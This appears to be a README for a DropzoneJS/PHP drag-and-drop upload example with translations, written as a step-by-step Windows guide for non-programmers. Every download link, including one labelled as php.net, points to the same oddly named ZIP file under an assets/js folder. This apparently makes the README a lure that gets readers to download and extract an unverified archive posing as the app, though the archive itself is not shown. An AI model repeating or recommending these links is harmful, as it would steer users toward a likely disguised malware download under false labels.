# 📁 dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php - Easy File Upload with Custom Previews

[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)

---

## 📋 About this Application

This app helps you upload and manage files using a simple drag-and-drop interface. It shows previews of your images and lets you delete files easily. The app supports different languages, so you can see text in your preferred language. It uses PHP to handle file uploads and deletions on your computer or server.

You do not need to know how to program. This guide will take you through the steps to download, install, and run the app on a Windows computer.

---

## 🖥️ System Requirements

- Windows 10 or later
- At least 2 GB of free disk space
- A modern web browser like Chrome, Firefox, or Edge
- PHP 7.2 or higher installed on your computer or server
- Internet connection to download the app

If you do not have PHP installed, you can get it from [php.net](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip). Installing PHP allows the app to handle uploads and deletions securely.

---

## 🔧 Features You Will Use

- Drag and drop files for easy uploads  
- Custom previews to see your images before upload  
- Multi-language support so the app text changes based on language settings  
- File deletion to remove uploaded files with one click  
- Visual progress bar to show upload status  
- Responsive design that works on desktop and tablet screens  

These make managing files simple and clear.

---

## 🚀 Getting Started With the Download

First, you need to download the app files. Visit this page to download all necessary components:

[![Download the App](https://img.shields.io/badge/Download-App%20Files-blue?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)

Follow the steps below carefully to get the app running on your Windows computer.

---

## ⬇️ How to Download the Application Files

1. Click the download button above or open this link in your browser:  
   https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip

2. On the page, look for the green **Code** button near the top right.

3. Click the **Code** button and select **Download ZIP**. This will download the app files in a compressed folder.

4. After downloading, open your **Downloads** folder and find the downloaded ZIP file.

5. Right-click the ZIP file and choose **Extract All...**. Extract the files to a folder you can easily access, such as your Desktop.

---

## 💻 How to Run the Application on Windows

Follow these steps to open the app and start uploading files:

1. Make sure PHP is installed on your computer. You can check this by opening **Command Prompt** and typing:

       php -v

   If PHP is installed, it will show the version number. If not, download and install PHP from the official website.

2. Open the folder where you extracted the app files.

3. Find the folder named `public` or the folder that contains `index.html` or `index.php`. This folder holds the web files you will use.

4. Start a local web server with PHP:

   - Open **Command Prompt**.
   - Navigate to the `public` folder by typing:

         cd path\to\public

     Replace `path\to\public` with the full folder path. For example:

         cd C:\Users\YourName\Desktop\dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php\public

   - Run the PHP built-in server with this command:

         php -S localhost:8000

   This starts a simple web server on your computer.

5. Open your web browser and go to:

       http://localhost:8000

6. You should see the app’s interface. You can now drag files to the upload area, preview them, upload them, and delete uploaded files.

---

## 🛠️ Using the App Interface

- Drag a file from your computer and drop it onto the shaded upload area.
- After you drop files, previews show the images or file names.
- Click the **Upload** button to send files to your PHP backend.
- See a progress bar showing how much of your file has uploaded.
- Uploaded files will appear in a list with an option to delete.
- Click **Delete** on files you want to remove.
- To change the language, look for a language selector dropdown if available.

---

## 🔄 Upload and Delete Process Details

The app uses PHP scripts to manage your files safely:

- Uploaded files are saved on your server or computer in a specific folder.
- The app shows previews before uploading to help you confirm your choices.
- After uploading, you can delete any file using the delete button next to the file name.
- Deleting removes the file from both the list and storage.

This works behind the scenes so you do not need to manage files manually.

---

## ⚙️ Adjusting Settings (Optional)

Options you can change if needed:

- **Upload folder location:** Change where files are saved by editing the PHP config files.
- **Maximum file size:** Set a limit on file sizes to prevent large uploads.
- **Allowed file types:** Restrict uploads to certain file types like images (jpg, png) or documents.
- **Language options:** Add or modify translations files included to support your preferred language.

Unless you need a custom setup, the default settings should work fine.

---

## 🔍 Troubleshooting Common Issues

- **The app does not load in the browser:**  
  Confirm PHP server is running with `php -S localhost:8000` in the folder with the app files.

- **Files won’t upload:**  
  Make sure the upload folder has writable permissions. Check your PHP installation supports file uploads.

- **Delete button does nothing:**  
  Ensure the PHP delete script is reachable and permissions allow file removal.

- **Language not changing:**  
  Reload the page fully or clear browser cache. Confirm the language files exist and are named correctly.

---

## 📂 Folder Structure Overview

Here is what you find inside the app folder:

- `index.html` or `index.php`: Main app page  
- `/uploads/`: Default folder where uploaded files are saved  
- `/js/`: JavaScript files used for drag-and-drop and preview  
- `/css/`: Style files for the page appearance  
- `/translations/`: Files that hold text in different languages  
- `/php/`: PHP scripts handling uploads and delete requests  

Do not delete any files or folders to keep the app working.

---

## 🔗 Useful Links

Access the app and get updates here:  
https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip

---

## 👨‍💻 Technical Notes

- The app uses DropzoneJS for the drag-and-drop interface.
- Translation support is done via language files loaded dynamically.
- PHP handles the backend upload and deletion logic.
- Bootstrap gives the interface a clean and responsive design.
- jQuery helps with DOM manipulation and user interaction.
- The app is meant to run on local servers or shared hosting with PHP enabled.

---

## 🔒 Security Notes

- Avoid running the app on public servers without proper security.
- Uploaded file types should be restricted to prevent harmful files.
- Set proper permissions on upload folders to avoid unauthorized access.

---

## 💡 Next Steps for Power Users

If you want to customize the app:

- Edit translation files to add new languages or change text.
- Modify CSS files to alter the look and feel.
- Change PHP upload limits in `php.ini` if needed.
- Integrate with your existing website by copying the relevant files and scripts.

---

[![Download the App](https://img.shields.io/badge/Download-App%20Files-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/katerinaheavy277/dropzonejs-example-with-translations-custom-preview-and-upload-delete-file-with-php/main/assets/js/delete_with_custom_preview_and_file_example_dropzonejs_php_upload_translations_isosterism.zip)